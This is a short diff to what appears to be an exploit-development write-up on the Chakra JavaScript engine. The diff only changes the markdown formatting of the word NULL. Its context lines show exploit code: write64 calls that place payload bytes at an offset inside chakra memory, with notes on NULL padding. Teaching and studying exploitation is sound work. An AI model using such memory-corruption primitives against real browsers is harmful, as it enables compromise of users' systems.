@@ -1533,7 +1533,7 @@ write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0000d5ff, );
 inc();
 ```
 
-Notice at the last line, we are missing 4 bytes. We can add some NULL padding (NULL bytes don't affect us because we aren't dealing with C-style strings). We need to update our last line as follows:
+Notice at the last line, we are missing 4 bytes. We can add some `NULL` padding (`NULL` bytes don't affect us because we aren't dealing with C-style strings). We need to update our last line as follows:
 
 ```javascript
 write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0000d5ff);
